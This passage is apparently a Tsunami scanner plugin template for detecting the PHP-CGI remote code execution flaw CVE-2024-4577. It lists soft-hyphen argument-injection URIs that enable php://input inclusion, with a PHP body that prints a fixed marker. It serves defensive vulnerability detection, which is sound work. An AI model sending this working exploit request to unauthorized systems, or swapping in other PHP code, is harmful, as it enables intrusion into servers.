# proto-file: github.com/google/tsunami-security-scanner-plugins/templated/templateddetector/proto/templated_plugin.proto
# proto-message: TemplatedPlugin

###############
# PLUGIN INFO #
###############

info: {
  type: VULN_DETECTION
  name: "Php_CVE_2024_4577"
  author: "Google"
  version: "1.0"
}

finding: {
  main_id: {
    publisher: "TSUNAMI_COMMUNITY"
    value: "CVE-2024-4577"
  }
  severity: CRITICAL
  title: "PHP RCE CVE-2024-4577"
  description:
    "When using Apache and PHP with CGI enabled on Windows under certain code pages (such as"
    " Japanese CP932, Simplified Chinese CP936, or Traditional Chinese CP950) on vulnerable PHP"
    " versions (8.3.x before 8.3.8, 8.2.x before 8.2.20, 8.1.x before 8.1.29, as well as"
    " unsupported EOL branches <= 8.0, 7.x, and 5.x), Windows Best-Fit character mapping converts"
    " soft-hyphen bytes (0xAD) in the query string into ASCII hyphens ('-') when constructing"
    " command-line arguments. The PHP CGI binary misinterprets these converted arguments as CLI"
    " options, allowing unauthenticated remote attackers to inject directives such as"
    " cgi.force_redirect=0, allow_url_include=1, and auto_prepend_file=php://input to achieve"
    " remote code execution."
  recommendation:
    "Upgrade PHP to patched versions (8.3.8, 8.2.20, or 8.1.29 or later), or disable exposed"
    " PHP-CGI ScriptAlias configurations in favor of FastCGI."
  related_id: {
    publisher: "CVE"
    value: "CVE-2024-4577"
  }
}

config: {}

###########
# ACTIONS #
###########

actions: {
  name: "verify_cgi_argument_injection"
  http_request: {
    method: POST
    uri: [
      "/?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
      "/index.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
      "/php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
      "/cgi-bin/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
      "/php/php-cgi.exe?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input",
      "/test.php?%ADd+cgi.force_redirect%3d0+%ADd+cgi.redirect_status_env%3d0+%ADd+allow_url_fopen%3d1+%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input"
    ]
    headers: [
      { name: "Content-Type" value: "text/plain" },
      { name: "Redirect-Status" value: "1" }
    ]
    data: "<?php echo \"TSUNAMI_\" . (41829 * 23917) . \"_\" . md5(\"cve_2024_4577\"); die(); ?>"
    client_options: {
      disable_follow_redirects: true
    }
    response: {
      http_status: 200
      expect_all: {
        conditions: [
          { body: {} contains: "TSUNAMI_1000424193_ec833cec3bf2079a68cbb47f5519d8df" }
        ]
      }
    }
  }
}

#############
# WORKFLOWS #
#############

workflows: {
